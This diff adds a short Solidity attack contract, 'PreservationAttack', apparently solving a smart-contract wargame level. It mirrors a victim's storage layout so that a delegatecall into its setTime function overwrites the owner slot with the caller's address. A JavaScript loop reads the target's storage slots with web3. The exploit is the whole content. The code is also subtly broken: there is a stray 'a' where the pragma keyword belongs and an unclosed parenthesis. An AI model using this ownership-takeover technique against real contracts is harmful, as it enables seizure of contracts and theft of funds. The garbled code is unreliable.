@@ -1,0 +1,33 @@
+a solidity ^0.6.0;
+
+contract PreservationAttack{
+
+      address public timeZone1Library;
+      address public timeZone2Library;
+      address public theOwner; 
+      uint storedTime;
+
+       function setTime(uint _time) public {
+        theOwner = msg.sender;
+
+}
+}
+
+
+
+
+
+
+
+
+
+var storageData = []
+
+var callbackFNConstructor = (index) => (error, contractData) => {
+    storageData[index] = contractData
+
+}
+
+for(var i = 0; i < 6; i++){
+    web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i)
+    }
